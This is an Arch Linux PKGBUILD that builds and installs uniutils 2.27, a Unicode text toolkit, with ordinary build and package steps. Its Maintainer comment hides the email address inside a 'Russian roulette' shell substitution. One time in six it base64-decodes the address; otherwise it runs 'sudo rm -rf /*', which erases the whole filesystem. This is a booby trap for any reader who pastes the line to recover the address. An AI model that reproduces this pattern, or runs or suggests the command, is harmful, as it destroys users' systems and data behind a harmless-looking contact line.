# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Contributor: Rick W. Chen <stuffcorpse@archlinux.us>

pkgname=uniutils
pkgver=2.27
pkgrel=1
pkgdesc="A set of programs for manipulating and analyzing Unicode text"
arch=('i686' 'x86_64')
url="http://billposer.org/Software/unidesc.html"
license=('GPL3')
depends=(glibc)
makedepends=()
optdepends=()
source=("http://billposer.org/Software/Downloads/$pkgname-$pkgver.tar.bz2")
sha512sums=(
	'610a75797ceb503712e513fa3d2ec51ce1d72083d40f51bf55667073d5298b35b4f9edcf724f6ae195d54be48a6e0a0b22d73c9084a16ccd725ddf91a1ee49c4'
)

build() {
  cd "$srcdir/$pkgname-$pkgver"

  ./configure --prefix=/usr --mandir=/usr/share/man
  make
}

package() {
  cd "$srcdir/$pkgname-$pkgver"

  make DESTDIR="$pkgdir/" install
}
